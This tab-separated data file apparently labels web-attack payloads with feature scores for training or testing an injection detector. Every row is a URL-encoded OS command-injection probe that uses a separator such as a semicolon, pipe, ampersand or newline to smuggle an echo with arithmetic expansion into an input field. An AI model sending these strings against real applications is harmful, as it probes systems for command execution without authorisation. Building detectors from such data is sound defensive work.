attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	output
%0aecho%20hnnugd$((25%2b95))$(echo%20hnnugd)hnnugd\	M	L	L	L	M	M	L	M	
%3becho%20ofikgo$((60%2b50))$(echo%20ofikgo)ofikgo\	M	L	L	L	M	M	L	M	
%26echo%20rkczil$((79%2b92))$(echo%20rkczil)rkczil\	M	L	L	L	M	M	L	M	
%26%26echo%20wljuon$((15%2b95))$(echo%20wljuon)wljuon\	M	L	L	L	M	M	L	M	
echo%20mteznm$((22%2b3))$(echo%20mteznm)mteznm&	M	L	L	L	M	M	L	M	
%20echo%20ypqtyx$((9%2b27))$(echo%20ypqtyx)ypqtyx&	M	L	L	L	M	M	L	M	
;echo%20unxfgj$((26%2b60))$(echo%20unxfgj)unxfgj&	M	L	L	L	M	M	L	M	
&echo%20kucrvn$((73%2b39))$(echo%20kucrvn)kucrvn&	M	L	L	L	M	M	L	M	
&&echo%20qagwej$((84%2b54))$(echo%20qagwej)qagwej&	M	L	L	L	M	M	L	M	
%0aecho%20hntzsh$((50%2b30))$(echo%20hntzsh)hntzsh&	M	L	L	L	M	M	L	M	
%3becho%20hgvpjy$((28%2b49))$(echo%20hgvpjy)hgvpjy&	M	L	L	L	M	M	L	M	
%26echo%20fwautf$((39%2b22))$(echo%20fwautf)fwautf&	M	L	L	L	M	M	L	M	
%26%26echo%20bsqkbm$((74%2b49))$(echo%20bsqkbm)bsqkbm&	M	L	L	L	M	M	L	M	
echo%20xoeucm$((23%2b30))$(echo%20xoeucm)xoeucm|	M	L	L	L	M	M	L	M	
%20echo%20drfynb$((7%2b97))$(echo%20drfynb)drfynb|	M	L	L	L	M	M	L	M	
;echo%20sirymp$((7%2b6))$(echo%20sirymp)sirymp|	M	L	L	L	M	M	L	M	
&echo%20sprawo$((58%2b5))$(echo%20sprawo)sprawo|	M	L	L	L	M	M	L	M	
&&echo%20gkemga$((51%2b90))$(echo%20gkemga)gkemga|	M	L	L	L	M	M	L	M	
%0aecho%20znolcp$((67%2b83))$(echo%20znolcp)znolcp|	M	L	L	L	M	M	L	M	
%3becho%20psheaa$((43%2b12))$(echo%20psheaa)psheaa|	M	L	L	L	M	M	L	M	
%26echo%20ypfsza$((90%2b71))$(echo%20ypfsza)ypfsza|	M	L	L	L	M	M	L	M	
%26%26echo%20bhddgg$((67%2b94))$(echo%20bhddgg)bhddgg|	M	L	L	L	M	M	L	M	
echo%20urjemh$((2%2b45))$(echo%20urjemh)urjemh%27	M	L	L	L	M	M	L	M	
%20echo%20alrhih$((11%2b27))$(echo%20alrhih)alrhih%27	M	L	L	L	M	M	L	M	
;echo%20iptszg$((46%2b17))$(echo%20iptszg)iptszg%27	M	L	L	L	M	M	L	M	
&echo%20yhcagi$((22%2b26))$(echo%20yhcagi)yhcagi%27	M	L	L	L	M	M	L	M	
|echo%20dzpiwa$((18%2b47))$(echo%20dzpiwa)dzpiwa%27	M	L	L	L	M	M	L	M	
||echo%20sjzfwv$((8%2b68))$(echo%20sjzfwv)sjzfwv%27	M	L	L	L	M	M	L	M	
&&echo%20qzxlok$((2%2b27))$(echo%20qzxlok)qzxlok%27	M	L	L	L	M	M	L	M	
%0aecho%20urbcmk$((17%2b54))$(echo%20urbcmk)urbcmk%27	M	L	L	L	M	M	L	M	
%3becho%20qhdgwh$((99%2b66))$(echo%20qhdgwh)qhdgwh%27	M	L	L	L	M	M	L	M	
%26echo%20wotyot$((32%2b39))$(echo%20wotyot)wotyot%27	M	L	L	L	M	M	L	M	
%26%26echo%20cssqpt$((9%2b40))$(echo%20cssqpt)cssqpt%27	H	L	L	L	M	M	L	M	
%7cecho%20cpqtyb$((64%2b20))$(echo%20cpqtyb)cpqtyb%27	M	L	L	L	M	M	L	M	
%7c%7cecho%20ebghxu$((74%2b4))$(echo%20ebghxu)ebghxu%27	H	L	L	L	M	M	L	M	
echo%20lennle$((14%2b89))$(echo%20lennle)lennle%22	M	L	L	L	M	M	L	M	
%20echo%20fpvlkt$((63%2b87))$(echo%20fpvlkt)fpvlkt%22	M	L	L	L	M	M	L	M	
;echo%20oihfac$((90%2b34))$(echo%20oihfac)oihfac%22	M	L	L	L	M	M	L	M	
&echo%20qlfuon$((35%2b62))$(echo%20qlfuon)qlfuon%22	M	L	L	L	M	M	L	M	
|echo%20geppdw$((55%2b58))$(echo%20geppdw)geppdw%22	M	L	L	L	M	M	L	M	
||echo%20detqcq$((28%2b83))$(echo%20detqcq)detqcq%22	M	L	L	L	M	M	L	M	
&&echo%20balagy$((97%2b95))$(echo%20balagy)balagy%22	M	L	L	L	M	M	L	M	
%0aecho%20petuuk$((81%2b85))$(echo%20petuuk)petuuk%22	M	L	L	L	M	M	L	M	
%3becho%20lbkhxk$((90%2b74))$(echo%20lbkhxk)lbkhxk%22	M	L	L	L	M	M	L	M	
%26echo%20joadau$((32%2b46))$(echo%20joadau)joadau%22	M	L	L	L	M	M	L	M	
%26%26echo%20dndlzd$((92%2b6))$(echo%20dndlzd)dndlzd%22	H	L	L	L	M	M	L	M	
%7cecho%20orhnzl$((45%2b63))$(echo%20orhnzl)orhnzl%22	M	L	L	L	M	M	L	M	
%7c%7cecho%20tedjvc$((96%2b45))$(echo%20tedjvc)tedjvc%22	H	L	L	L	M	M	L	M	
echo%20aqrkll$((20%2b31))$(echo%20aqrkll)aqrkll%5c%5c	M	L	L	L	M	M	L	M	
%20echo%20ckfaye$((18%2b45))$(echo%20ckfaye)ckfaye%5c%5c	H	L	L	L	M	M	L	M	
;echo%20hybmmw$((16%2b36))$(echo%20hybmmw)hybmmw%5c%5c	M	L	L	L	M	M	L	M	
&echo%20noksur$((8%2b35))$(echo%20noksur)noksur%5c%5c	M	L	L	L	M	M	L	M	
&&echo%20mkgyyl$((46%2b31))$(echo%20mkgyyl)mkgyyl%5c%5c	M	L	L	L	M	M	L	M	
%0aecho%20anstbn$((20%2b35))$(echo%20anstbn)anstbn%5c%5c	H	L	L	L	M	M	L	M	
%3becho%20ohylgw$((56%2b18))$(echo%20ohylgw)ohylgw%5c%5c	H	L	L	L	M	M	L	M	
%26echo%20nfgink$((64%2b92))$(echo%20nfgink)nfgink%5c%5c	H	L	L	L	M	M	L	M	
%26%26echo%20ejacrb$((30%2b66))$(echo%20ejacrb)ejacrb%5c%5c	H	L	L	L	M	M	L	M	
echo%20tjaxuj$((80%2b70))$(echo%20tjaxuj)tjaxuj%2f%2f	M	L	L	L	M	M	L	M	
%20echo%20rgmcli$((27%2b75))$(echo%20rgmcli)rgmcli%2f%2f	H	L	L	L	M	M	L	M	
;echo%20kuxgtm$((7%2b89))$(echo%20kuxgtm)kuxgtm%2f%2f	M	L	L	L	M	M	L	M	
&echo%20ccyvif$((50%2b63))$(echo%20ccyvif)ccyvif%2f%2f	M	L	L	L	M	M	L	M	
&&echo%20rlcxad$((4%2b93))$(echo%20rlcxad)rlcxad%2f%2f	M	L	L	L	M	M	L	M	
%0aecho%20kymbvz$((7%2b62))$(echo%20kymbvz)kymbvz%2f%2f	H	L	L	L	M	M	L	M	
%3becho%20svfhgu$((48%2b4))$(echo%20svfhgu)svfhgu%2f%2f	H	L	L	L	M	M	L	M	
%26echo%20oxzpgu$((40%2b61))$(echo%20oxzpgu)oxzpgu%2f%2f	H	L	L	L	M	M	L	M	
